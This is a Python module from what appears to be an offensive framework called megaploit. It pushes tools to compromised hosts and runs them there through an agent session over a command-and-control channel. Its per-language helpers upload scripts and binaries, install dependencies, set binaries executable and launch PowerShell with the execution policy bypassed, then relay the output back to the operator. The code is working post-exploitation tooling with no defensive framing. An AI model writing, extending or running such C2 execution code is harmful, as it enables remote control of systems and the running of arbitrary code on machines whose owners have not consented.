"""
megaploit.toolbox.runner
~~~~~~~~~~~~~~~~~~~~~~~~
Execute installed tools.

Local mode
----------
Run the tool on the operator's machine using tool.resolved_run_cmd().
Works for every language — Python, Go binaries, Rust binaries, Node,
Ruby, Java jars, Bash scripts, PowerShell scripts, compiled C/C++.

Remote (deploy) mode
--------------------
Push the tool to the active agent session and execute it there.

Strategy per language:
  Python     → upload entry .py + requirements.txt (if any), run via python
  Bash/Shell → upload .sh, run via bash
  PowerShell → upload .ps1, run via pwsh/powershell
  Binary / Go / Rust / C → upload the compiled binary, chmod +x, run directly
  Node       → upload entry .js + node_modules tarball isn't feasible;
               instead run locally and relay to the IP (preferred approach)
  Java       → upload the jar, run via java -jar
  Ruby       → upload entry .rb, run via ruby
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import threading
import zipfile
from typing import Callable, Optional

from megaploit.toolbox.registry import (
    Tool, registry,
    LANG_PYTHON, LANG_GO, LANG_RUST, LANG_NODE,
    LANG_RUBY, LANG_JAVA, LANG_BASH, LANG_POWERSHELL,
    LANG_BINARY, LANG_UNKNOWN,
)

OutputFn = Callable[[str], None]
_NOOP: OutputFn = lambda _: None


# ---------------------------------------------------------------------------
# Local execution
# ---------------------------------------------------------------------------

def run_local(
    name: str,
    tool_args: list[str],
    output: OutputFn = _NOOP,
    timeout: Optional[int] = None,
) -> int:
    """
    Run the named tool locally using its resolved launch command.
    Streams stdout/stderr line-by-line to *output*.
    Returns the process exit code.
    """
    tool = _get_tool(name)
    cmd = tool.resolved_run_cmd() + tool_args

    output(f"[*] Language   : {tool.lang}")
    output(f"[*] Command    : {' '.join(cmd)}")
    output(f"[*] Working dir: {tool.path}")
    output("")

    proc = subprocess.Popen(
        cmd,
        cwd=tool.path,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="replace",
    )

    def _stream():
        for line in proc.stdout:
            output(line.rstrip())

    t = threading.Thread(target=_stream, daemon=True)
    t.start()
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        output(f"\n[!] Tool timed out after {timeout}s — process killed.")
    finally:
        t.join(timeout=2)

    output(f"\n[*] Exit code: {proc.returncode}")
    return proc.returncode


# ---------------------------------------------------------------------------
# Remote (deploy) execution
# ---------------------------------------------------------------------------

def run_remote(
    name: str,
    tool_args: list[str],
    session,            # megaploit.server.session.Session
    output: OutputFn = _NOOP,
    timeout: int = 120,
) -> None:
    """
    Upload the tool to the agent and execute it there, routing through the
    C2 channel.  Strategy chosen automatically based on tool language.
    """
    tool = _get_tool(name)

    output(f"[*] Language: {tool.lang}")

    if tool.lang == LANG_PYTHON:
        _remote_python(tool, tool_args, session, output, timeout)

    elif tool.lang in (LANG_BASH,):
        _remote_script(tool, tool_args, session, output, timeout,
                       interpreter=shutil.which("bash") or "bash")

    elif tool.lang == LANG_POWERSHELL:
        ps = shutil.which("pwsh") or "powershell"
        _remote_script(tool, tool_args, session, output, timeout,
                       interpreter=ps,
                       extra_flags=["-ExecutionPolicy", "Bypass", "-File"])

    elif tool.lang == LANG_RUBY:
        ruby = shutil.which("ruby") or "ruby"
        _remote_script(tool, tool_args, session, output, timeout,
                       interpreter=ruby)

    elif tool.lang in (LANG_GO, LANG_RUST, LANG_BINARY, LANG_UNKNOWN):
        _remote_binary(tool, tool_args, session, output, timeout)

    elif tool.lang == LANG_JAVA:
        _remote_java(tool, tool_args, session, output, timeout)

    elif tool.lang == LANG_NODE:
        _remote_node(tool, tool_args, session, output, timeout)

    else:
        # Generic fallback — try uploading entry and running it
        _remote_script(tool, tool_args, session, output, timeout,
                       interpreter=sys.executable)


# ---------------------------------------------------------------------------
# Remote helpers — one per language family
# ---------------------------------------------------------------------------

def _remote_python(
    tool: Tool, args: list[str], session, output: OutputFn, timeout: int
) -> None:
    from megaploit.core.protocol import send_msg, recv_msg, send_file, recv_file

    remote_name = f"_tool_{tool.name}.py"
    output(f"[*] Uploading {tool.entry} → {remote_name}")
    send_msg(session.conn, f"upload {remote_name}")
    send_file(session.conn, tool.entry_path)

    # Also upload requirements.txt if it exists (let agent install deps)
    req = os.path.join(tool.path, "requirements.txt")
    if os.path.isfile(req):
        remote_req = f"_tool_{tool.name}_req.txt"
        output(f"[*] Uploading requirements.txt → {remote_req}")
        send_msg(session.conn, f"upload {remote_req}")
        send_file(session.conn, req)
        pip_cmd = f"pip install -q -r {remote_req}"
        output(f"[*] Installing deps: {pip_cmd}")
        send_msg(session.conn, pip_cmd)
        _recv_output(session, output, timeout=30)

    arg_str = " ".join(args)
    shell_cmd = f"python {remote_name} {arg_str}".strip()
    output(f"[*] Executing: {shell_cmd}")
    send_msg(session.conn, shell_cmd)
    _recv_output(session, output, timeout)


def _remote_script(
    tool: Tool, args: list[str], session, output: OutputFn, timeout: int,
    interpreter: str, extra_flags: list[str] | None = None,
) -> None:
    from megaploit.core.protocol import send_msg, send_file

    suffix = os.path.splitext(tool.entry)[1]
    remote_name = f"_tool_{tool.name}{suffix}"
    output(f"[*] Uploading {tool.entry} → {remote_name}")
    send_msg(session.conn, f"upload {remote_name}")
    send_file(session.conn, tool.entry_path)

    flags = extra_flags or []
    arg_str = " ".join(args)
    shell_cmd = " ".join(
        [interpreter] + flags + [remote_name] + ([arg_str] if arg_str else [])
    )
    output(f"[*] Executing: {shell_cmd}")
    send_msg(session.conn, shell_cmd)
    _recv_output(session, output, timeout)


def _remote_binary(
    tool: Tool, args: list[str], session, output: OutputFn, timeout: int
) -> None:
    from megaploit.core.protocol import send_msg, send_file

    binary_path = tool.entry_path
    remote_name = f"_tool_{tool.name}"
    if sys.platform == "win32" and not remote_name.endswith(".exe"):
        remote_name += ".exe"

    output(f"[*] Uploading binary {os.path.basename(binary_path)} → {remote_name}")
    send_msg(session.conn, f"upload {remote_name}")
    send_file(session.conn, binary_path)

    # Make executable on Unix targets
    send_msg(session.conn, f"chmod +x {remote_name}")
    _recv_output(session, output, timeout=5)

    arg_str = " ".join(args)
    shell_cmd = f"./{remote_name} {arg_str}".strip()
    if sys.platform == "win32":
        shell_cmd = f"{remote_name} {arg_str}".strip()

    output(f"[*] Executing: {shell_cmd}")
    send_msg(session.conn, shell_cmd)
    _recv_output(session, output, timeout)


def _remote_java(
    tool: Tool, args: list[str], session, output: OutputFn, timeout: int
) -> None:
    from megaploit.core.protocol import send_msg, send_file

    jar_path = tool.entry_path
    remote_jar = f"_tool_{tool.name}.jar"
    output(f"[*] Uploading {os.path.basename(jar_path)} → {remote_jar}")
    send_msg(session.conn, f"upload {remote_jar}")
    send_file(session.conn, jar_path)

    arg_str = " ".join(args)
    shell_cmd = f"java -jar {remote_jar} {arg_str}".strip()
    output(f"[*] Executing: {shell_cmd}")
    send_msg(session.conn, shell_cmd)
    _recv_output(session, output, timeout)


def _remote_node(
    tool: Tool, args: list[str], session, output: OutputFn, timeout: int
) -> None:
    """
    Node tools with npm deps can't be easily shipped to the target.
    Upload the entry .js and attempt to run it — works for self-contained scripts.
    For tools with heavy node_modules, prefer toolbox_run (local mode).
    """
    from megaploit.core.protocol import send_msg, send_file

    remote_name = f"_tool_{tool.name}.js"
    output(f"[*] Uploading {tool.entry} → {remote_name}")
    output(f"[!] Note: node_modules are NOT uploaded — use toolbox_run for dep-heavy tools")
    send_msg(session.conn, f"upload {remote_name}")
    send_file(session.conn, tool.entry_path)

    node = shutil.which("node") or "node"
    arg_str = " ".join(args)
    shell_cmd = f"{node} {remote_name} {arg_str}".strip()
    output(f"[*] Executing: {shell_cmd}")
    send_msg(session.conn, shell_cmd)
    _recv_output(session, output, timeout)


# ---------------------------------------------------------------------------
# Shared response receiver
# ---------------------------------------------------------------------------

def _recv_output(session, output: OutputFn, timeout: int) -> None:
    from megaploit.core.protocol import recv_msg

    old = session.conn.gettimeout()
    session.conn.settimeout(timeout)
    try:
        resp = recv_msg(session.conn)
        if resp:
            output(str(resp))
    except Exception as e:
        output(f"[-] Error receiving output: {e}")
    finally:
        session.conn.settimeout(old)


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _get_tool(name: str) -> Tool:
    tool = registry.get(name)
    if not tool:
        raise RuntimeError(f"Tool '{name}' not found — install it with:  toolbox install <url> {name}")
    if not tool.is_installed:
        raise RuntimeError(f"Tool directory missing: {tool.path}")
    return tool
